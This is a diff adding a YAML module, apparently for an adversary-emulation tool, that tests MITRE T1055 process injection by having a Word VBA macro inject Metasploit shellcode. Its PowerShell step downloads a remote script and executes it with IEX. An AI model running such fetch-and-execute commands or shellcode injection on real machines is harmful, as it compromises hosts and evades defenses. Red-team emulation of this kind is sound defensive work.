@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: Shellcode execution via VBA
+description: |
+    This module injects shellcode into a newly created process and executes. By default the shellcode is created,
+    with Metasploit, for use on x86-64 Windows 10 machines.
+
+    Note: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office
+    is required.
+args:
+    - name: txt_path
+      type: path
+      default: PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt
+uuid: 1c91e740-1729-4329-b779-feba6e71d048
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1055: Process Injection'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: shellcode-execution-via-vba
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+        Invoke-Maldoc -macroFile "{{.Args.txt_path}}" -officeProduct "Word" -sub "Execute"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
